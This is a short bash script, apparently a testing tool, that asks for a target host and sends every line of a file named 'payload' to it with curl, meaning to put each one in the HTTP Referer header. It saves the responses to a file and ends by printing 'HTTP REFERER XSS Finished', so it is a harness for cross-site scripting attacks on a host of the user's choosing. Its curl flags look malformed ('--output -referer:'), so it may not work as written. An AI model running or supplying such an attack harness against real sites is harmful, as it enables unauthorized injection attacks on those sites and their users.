#!/bin/bash
echo -e "[-] Input Setting"
echo -ne "[+] Enter Host: "
read Host
echo -e "[-] Posting"

while read payload
do
content=$(curl -i -v --output -referer: "${payload}" $Host)
 echo $payload
 echo $content >> http_referer_payloadoutput.txt
done < payload
echo -e "";
echo -e "[-] HTTP REFERER XSS Finished       "
echo -e "";